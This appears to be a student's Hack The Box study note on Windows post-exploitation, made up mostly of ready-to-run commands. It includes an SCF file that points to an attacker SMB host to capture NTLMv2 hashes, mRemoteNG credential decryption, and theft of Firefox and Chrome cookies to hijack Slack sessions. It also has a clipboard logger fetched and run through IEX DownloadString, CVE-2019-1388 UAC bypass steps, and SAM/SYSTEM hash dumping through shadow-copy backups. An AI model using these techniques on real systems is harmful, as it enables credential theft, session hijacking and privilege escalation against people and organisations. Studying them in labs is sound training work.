# Additional Techniques

## **SCF on a File Share**

A Shell Command File (SCF) is used by Windows Explorer to move up and down directories, show the Desktop, etc. An SCF file can be manipulated to have the icon file location point to a specific UNC path and have Windows Explorer start an SMB session when the folder where the .scf file resides is accessed. If we change the IconFile to an SMB server that we control and run a tool such as [Responder](https://github.com/lgandx/Responder), [Inveigh](https://github.com/Kevin-Robertson/Inveigh), or [InveighZero](https://github.com/Kevin-Robertson/InveighZero), we can often capture NTLMv2 password hashes for any users who browse the share.

```
[Shell]
Command=2
IconFile=\\\\10.10.14.3\\share\\legit.ico
[Taskbar]
Command=ToggleDesktop
```

we will create above scf file named `@Inventory.scf` pointing to our SMB server. we can then capture the NTLMv2 hash

```
dollarboysushil@htb[/htb]$ sudo responder -wrf -v -I tun0
```

Create smb server.

## **Pillaging**

Pillaging is the process of obtaining information from a compromised system.

#### **Get Installed Programs via PowerShell & Registry Keys**

```powershell
PS C:\\htb> $INSTALLED = Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* |  Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\\htb> $INSTALLED += Get-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, InstallLocation
PS C:\\htb> $INSTALLED | ?{ $_.DisplayName -ne $null } | sort-object -Property DisplayName -Unique | Format-Table -AutoSize

DisplayName                                         DisplayVersion    InstallLocation
-----------                                         --------------    ---------------
Adobe Acrobat DC (64-bit)                           22.001.20169      C:\\Program Files\\Adobe\\Acrobat DC\\
CORSAIR iCUE 4 Software                             4.23.137          C:\\Program Files\\Corsair\\CORSAIR iCUE 4 Software
Google Chrome                                       103.0.5060.134    C:\\Program Files\\Google\\Chrome\\Application
Google Drive                                        60.0.2.0          C:\\Program Files\\Google\\Drive File Stream\\60.0.2.0\\GoogleDriveFS.exe
Microsoft Office Profesional Plus 2016 - es-es      16.0.15330.20264  C:\\Program Files (x86)\\Microsoft Office
Microsoft Office Professional Plus 2016 - en-us     16.0.15330.20264  C:\\Program Files (x86)\\Microsoft Office
mRemoteNG                                           1.62              C:\\Program Files\\mRemoteNG
TeamViewer                                          15.31.5           C:\\Program Files\\TeamViewer
...SNIP...
```

or using cmd `C:\\>dir "C:\\Program Files"`

from the result, `mRemoteNG` stands out. `mRemoteNG` is a tool used to manage and connect to remote systems using VNC, RDP, SSH, and similar protocols.

`mRemoteNG` saves connection info and creds in `confCons.xml` file. default location `%USERPROFILE%\\APPDATA\\Roaming\\mRemoteNG`.  They use a hardcoded master password, `mR3m`, so if anyone starts saving credentials in `mRemoteNG` and does not protect the configuration with a password, we can access the credentials from the configuration file and decrypt them.

```powershell
PS C:\\htb> ls C:\\Users\\julio\\AppData\\Roaming\\mRemoteNG

    Directory: C:\\Users\\julio\\AppData\\Roaming\\mRemoteNG

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----        7/21/2022   8:51 AM                Themes
-a----        7/21/2022   8:51 AM            340 confCons.xml
              7/21/2022   8:51 AM            970 mRemoteNG.log
```

We can get the encrypted passwod from the `confCons.xml` . Which can be decrypted using [https://github.com/haseebT/mRemoteNG-Decrypt](https://github.com/haseebT/mRemoteNG-Decrypt)

```
dollarboysushil@htb[/htb]$ python3 mremoteng_decrypt.py -s "sPp6b6Tr2iyXIdD/KFNGEWzzUyU84ytR95psoHZAFOcvc8LGklo+XlJ+n+KrpZXUTs2rgkml0V9u8NEBMcQ6UnuOdkerig=="
```

`-s` flag to specify the encrypted password

If user is using custom password for to protect the configuration then we can decrypt the hash by specifying the password.

```
dollarboysushil@htb[/htb]$ python3 mremoteng_decrypt.py -s "EBHmUA3DqM3sHushZtOyanmMowr/M/hd8KnC3rUJfYrJmwSj+uGSQWvUWZEQt6wTkUqthXrf2n8AR477ecJi5Y0E/kiakA==" -p [custom password]
```

## **Abusing Cookies to Get Access to IM Clients**

instant messaging (IM) applications like `Slack` and `Microsoft Teams`

#### **Copy Firefox Cookies Database**

Firefox saves the cookies in an SQLite database in file named `cookies.sqlite` located at `%APPDATA%\\Mozilla\\Firefox\\Profiles\\<RANDOM>.default-release`.

* `PS C:\\htb> copy $env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\cookies.sqlite .` → copy the cookies db.
* Then use  [cookieextractor.py](https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/cookieextractor.py) to extract the cookies

```
dollarboysushil@htb[/htb]$ python3 cookieextractor.py --dbpath "/home/plaintext/cookies.sqlite" --host slack --cookie d
```

#### **Cookie Extraction from Chromium-based Browsers**

The chromium-based browser also stores its cookies information in an SQLite database. The only difference is that the cookie value is encrypted with [Data Protection API (DPAPI)](https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection). `DPAPI` is commonly used to encrypt data using information from the current user account or computer.

For this we can use [`sharpchromium`](https://github.com/djhohnstein/SharpChromium/blob/master/ChromiumCredentialManager.cs#L47)

`SharpChromium` is looking for a file in `%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Cookies`, but the actual file is located in `%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\\Network\\Cookies` with the following command we will copy the file to the location SharpChromium is expecting.

* `PS C:\\htb> copy "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Network\\Cookies" "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Cookies"`

```powershell
PS C:\\htb> Invoke-SharpChromium -Command "cookies slack.com"

[*] Beginning Google Chrome extraction.

--- Chromium Cookie (User: lab_admin) ---
Domain         : slack.com
Cookies (JSON) :
[

<SNIP>

{
    "domain": ".slack.com",
    "expirationDate": 1974643257.67155,
    "hostOnly": false,
    "sion": false,
    "storeId": null,
    "value": "xoxd-5KK4K2RK2ZLs2sISUEBGUTxLO0dRD8y1wr0Mvst%2Bm7Vy24yi..........OrXV83hNeTYg%3D%3D"
},
{
    "domain": ".slack.com",
    "hostOnly": false,
    "h": "1659023172"
},

<SNIP>

]

[*] Finished Google Chrome extraction.

[*] Done.
```

## **Clipboard**

```powershell
PS C:\\htb> IEX(New-Object Net.WebClient).DownloadString('<https://raw.githubusercontent.com/inguardians/Invoke-Clipboard/master/Invoke-Clipboard.ps1>')
PS C:\\htb> Invoke-ClipboardLogger
```

when ever a user copies something, we will get the result in our powershell session.

## **Roles and Services (Backup servers)**

`Restic` is a modern backup program that can back up files in Linux, BSD, Mac, and Windows.

In Restic we need to specify a directory to store the backup, lets create a backup directory.

* `PS C:\\htb> mkdir E:\\restic2`
* `restic.exe -r E:\\restic2 init` → initialize the directory

Then backup directory

```powershell
PS C:\\htb> $env:RESTIC_PASSWORD = 'Password'
PS C:\\htb> restic.exe -r E:\\restic2\\ backup C:\\SampleFolder
```

here we are backing up `samplefolder` to `restic2` folder.

If we want to back up a directory such as `C:\\Windows`, which has some files actively used by the operating system, we can use the option `--use-fs-snapshot` to create a VSS (Volume Shadow Copy) to perform the backup.

* `PS C:\\htb> restic.exe -r E:\\restic2\\ backup C:\\Windows\\System32\\config --use-fs-snapshot`

***

***

Lets check for the saved backups

* `PS C:\\htb> restic.exe -r E:\\restic2\\ snapshots`

we can restore the backup with id ;

* `PS C:\\htb> restic.exe -r E:\\restic2\\ restore 9971e881 --target C:\\Restore`

If we navigate to `C:\\Restore`, we will find the directory structure where the backup was taken. To get to the `SampleFolder` directory, we need to navigate to `C:\\Restore\\C\\SampleFolder`.

## **Miscellaneous Techniques**

[https://lolbas-project.github.io/](https://lolbas-project.github.io/) documents binaries, scripts, and libraries that can be used for "living off the land" techniques on Windows systems.

#### **CVE-2019-1388 Abuse UAC Windows Certificate Dialog**

```
1) find a program that can trigger the UAC prompt screen

2) select "Show more details"

3) select "Show information about the publisher's certificate"

4) click on the "Issued by" URL link it will prompt a browser interface.

5) wait for the site to be fully loaded & select "save as" to prompt a explorer window for "save as".

6) on the explorer window address path, enter the cmd.exe full path:
C:\\WINDOWS\\system32\\cmd.exe

7) now you'll have an escalated privileges command prompt.
```

## **Mount VHDX/VMDK**

* `dollarboysushil@htb[/htb]**$** guestmount -a SQL01-disk1.vmdk -i --ro /mnt/vmdk` → mount VMDK on linux
* `dollarboysushil@htb[/htb]**$** guestmount --add WEBSRV10.vhdx --ro /mnt/vhdx/ -m /dev/sda1` → mount VHD/VHDX on linux

then retrieve sam, security and system files and get hash using

* `dollarboysushil@htb[/htb]$ [secretsdump.py](<http://secretsdump.py/>) -sam SAM -security SECURITY -system SYSTEM LOCAL`

## **User/Computer Description Field**

* `PS C:\\htb> Get-LocalUser`
* `PS C:\\htb> Get-WmiObject -Class Win32_OperatingSystem | select Description`

## **Running Sherlock to find Vuln**

* `PS C:\\htb> Set-ExecutionPolicy bypass -Scope process`
* `PS C:\\htb> Import-Module .\\Sherlock.ps1`
* `PS C:\\htb> Find-AllVulns`
